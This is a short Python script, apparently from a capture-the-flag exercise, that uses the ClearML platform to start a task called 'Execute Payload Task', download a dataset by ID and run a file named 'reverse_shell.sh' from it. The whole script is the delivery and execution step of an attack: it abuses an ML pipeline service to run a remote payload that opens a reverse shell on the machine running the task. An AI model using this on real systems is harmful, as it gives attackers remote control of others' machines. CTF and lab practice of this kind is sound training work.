from clearml import Task, Dataset
import subprocess
import os

# Inicializa la tarea en ClearML
task = Task.init(project_name='CTF Project', task_name='Execute Payload Task')

# Vincula el dataset a la tarea
dataset = Dataset.get(dataset_id='ead155e4688e4e86b368a2e6f582eeab')
dataset_path = dataset.get_local_copy()

# Cambia al directorio del dataset
os.chdir(dataset_path)

# Ejecuta el payload
subprocess.run(['bash', 'reverse_shell.sh'])
